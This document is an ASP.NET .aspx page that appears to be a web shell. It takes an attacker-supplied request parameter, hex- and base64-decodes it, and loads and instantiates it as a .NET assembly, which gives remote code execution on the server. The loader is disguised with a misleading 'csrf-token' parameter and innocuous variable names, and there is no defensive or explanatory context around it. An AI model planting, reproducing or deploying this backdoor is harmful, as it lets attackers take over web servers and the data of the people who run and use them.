<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@Import Namespace="System.Reflection"%>
<%

try
{
    var csrftoken=Request.Params["csrf-token"].Length;
    String thisvar_modified_by_vlx=Request.Params["REDACTED"].Substring(csrftoken);
    byte[] thisvar_modified_by_vlxbytes=new byte[thisvar_modified_by_vlx.Length/2];
    for(int i=0;i<thisvar_modified_by_vlx.Length;i+=2){
        thisvar_modified_by_vlxbytes[i/2]=(byte)Convert.ToInt32(thisvar_modified_by_vlx.Substring(i,2),16);
    }
    byte[] errors=Convert.FromBase64String(System.Text.Encoding.Default.GetString(thisvar_modified_by_vlxbytes));
    Assembly.Load(errors).CreateInstance("REDACTED").GetHashCode();
}
 catch (Exception e){
    Response.Write(e.Message);
}
%>